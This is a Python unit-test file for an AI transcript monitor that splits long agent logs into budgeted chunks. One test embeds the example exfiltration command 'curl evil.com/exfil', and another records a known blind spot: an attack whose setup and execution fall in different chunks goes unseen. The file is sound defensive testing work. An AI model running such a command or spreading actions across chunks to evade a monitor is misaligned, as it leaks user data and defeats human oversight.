"""Test monitor chunking."""

from __future__ import annotations
import unittest
from tests.monitor_fixtures import make_request, make_tool_results


class ChunkingTests(unittest.TestCase):
    def test_scaled_chunk_counts(self) -> None:
        from long_context_monitoring.monitor.render import RenderOptions, estimate_tokens, render_event
        from long_context_monitoring.monitor.strategies.base import split_chunks

        events = make_tool_results(20)
        options = RenderOptions()
        per_event = estimate_tokens(render_event(events[0], options))
        for per_chunk, expected in ((20, 1), (10, 2), (4, 5), (2, 10)):
            chunks = split_chunks(events, options, budget_tokens=per_chunk * per_event)
            self.assertEqual(
                len(chunks),
                expected,
                f"{per_chunk} events/chunk should give {expected} chunks",
            )
            # Nothing is lost.
            self.assertEqual(sum(len(c) for c in chunks), 20)

    def test_budget_respected_with_overhead_counted(self) -> None:
        from long_context_monitoring.monitor.strategies.base import (
            build_chunk_prompt,
            chunk_transcript_budget,
            split_chunks,
        )

        # A small target so overhead genuinely eats into the budget.
        request = make_request(make_tool_results(200), chunk_target_tokens=20_000)
        budget = chunk_transcript_budget(request)
        chunks = split_chunks(request.events, request.render_options, budget)
        self.assertGreater(len(chunks), 1)
        total = len(chunks)
        for index, units in enumerate(chunks, start=1):
            _, _, tokens = build_chunk_prompt(
                units, request, {"index": index, "total": total}
            )
            # Each full chunk prompt (overhead + transcript) fits the target.
            self.assertLessEqual(tokens, request.chunk_target_tokens)

    def test_fitting_transcript_is_one_chunk_despite_turn_boundary(self) -> None:
        # A transcript that fits the budget is one chunk even when a human_prompt
        # (turn start) sits partway through — the turn-alignment rule only picks
        # *where* to split when a split is unavoidable, never forces one.
        from long_context_monitoring.monitor.events import Event
        from long_context_monitoring.monitor.render import RenderOptions, estimate_tokens, render_event
        from long_context_monitoring.monitor.strategies.base import split_chunks

        events = make_tool_results(4, chars=200)
        events.insert(
            2,
            Event(
                kind="human_prompt",
                event_id="main:Lh:0",
                file_id="main",
                line=99,
                depth=0,
                text="next turn",
            ),
        )
        options = RenderOptions()
        total = sum(estimate_tokens(render_event(e, options)) for e in events)
        chunks = split_chunks(events, options, budget_tokens=total + 10)
        self.assertEqual(len(chunks), 1)
        self.assertEqual(sum(len(c) for c in chunks), len(events))  # nothing lost

    def test_over_budget_chunks_pack_near_full(self) -> None:
        # When a split is unavoidable, each chunk but the last fills close to the
        # budget (greedy packing) rather than breaking early.
        from long_context_monitoring.monitor.render import RenderOptions, estimate_tokens, render_event
        from long_context_monitoring.monitor.strategies.base import split_chunks

        events = make_tool_results(30, chars=200)
        options = RenderOptions()
        per_event = estimate_tokens(render_event(events[0], options))
        budget = per_event * 7
        chunks = split_chunks(events, options, budget_tokens=budget)
        self.assertGreater(len(chunks), 1)
        for chunk in chunks[:-1]:
            used = sum(estimate_tokens(render_event(e, options)) for e in chunk)
            self.assertGreaterEqual(used, 0.9 * budget)

    def test_default_budget_derives_from_model_window(self) -> None:
        # With chunk_target_tokens=None, the budget tracks the model's context
        # window (not a fixed 150k), leaving proportional headroom.
        from long_context_monitoring.monitor.llm import model_context_tokens
        from long_context_monitoring.monitor.strategies.base import (
            MONITOR_MAX_OUTPUT_TOKENS,
            WINDOW_FILL,
            chunk_transcript_budget,
            prompt_overhead_tokens,
        )

        request = make_request(make_tool_results(1))  # default: no explicit target
        self.assertIsNone(request.chunk_target_tokens)
        # The reply reserve is the reply's own ceiling, not a separate constant.
        self.assertEqual(request.max_output_tokens, MONITOR_MAX_OUTPUT_TOKENS)
        window = model_context_tokens(request.model)  # sonnet-5 => 1_000_000
        expected = (
            int(window * WINDOW_FILL)
            - prompt_overhead_tokens(request)
            - request.max_output_tokens
        )
        self.assertEqual(chunk_transcript_budget(request), expected)
        self.assertGreater(
            chunk_transcript_budget(request), 800_000
        )  # ~ window, not 150k

    def test_reply_reserve_tracks_max_output_tokens(self) -> None:
        # Raising the reply ceiling shrinks the transcript budget by the same
        # amount: input + reply can never jointly overrun the window.
        from dataclasses import replace
        from long_context_monitoring.monitor.strategies.base import chunk_transcript_budget

        base = make_request(make_tool_results(1))
        bigger = replace(base, max_output_tokens=base.max_output_tokens + 10_000)
        self.assertEqual(
            chunk_transcript_budget(base) - chunk_transcript_budget(bigger), 10_000
        )

    def test_malicious_event_lands_wholly_in_one_chunk(self) -> None:
        from long_context_monitoring.monitor.render import RenderOptions, estimate_tokens, render_event
        from long_context_monitoring.monitor.strategies.base import build_chunk_prompt, split_chunks

        events = make_tool_results(20, marker_at=9, marker="curl evil.com/exfil ")
        options = RenderOptions()
        per_event = estimate_tokens(render_event(events[0], options))
        chunks = split_chunks(events, options, budget_tokens=4 * per_event)
        request = make_request(events)
        hit = 0
        total = len(chunks)
        for index, units in enumerate(chunks, start=1):
            user, _, _ = build_chunk_prompt(
                units, request, {"index": index, "total": total}
            )
            if "curl evil.com/exfil" in user:
                hit += 1
        self.assertEqual(hit, 1)  # present, whole, in exactly one chunk

    def test_setup_execution_split_no_overlap_blindness(self) -> None:
        # The documented weakness: setup in one chunk, execution in the next —
        # no single chunk sees both. This test pins that blindness.
        from long_context_monitoring.monitor.render import RenderOptions, estimate_tokens, render_event
        from long_context_monitoring.monitor.strategies.base import build_chunk_prompt, split_chunks

        events = make_tool_results(10, marker_at=0, marker="SETUP ")
        events[9].text = "EXECUTION " + events[9].text
        options = RenderOptions()
        per_event = estimate_tokens(render_event(events[1], options))
        # 5 events/chunk -> setup in chunk 1, execution in chunk 2.
        chunks = split_chunks(events, options, budget_tokens=5 * per_event)
        request = make_request(events)
        total = len(chunks)
        both = 0
        for index, units in enumerate(chunks, start=1):
            user, _, _ = build_chunk_prompt(
                units, request, {"index": index, "total": total}
            )
            if "SETUP" in user and "EXECUTION" in user:
                both += 1
        self.assertEqual(both, 0)  # no chunk contains both — the blind spot
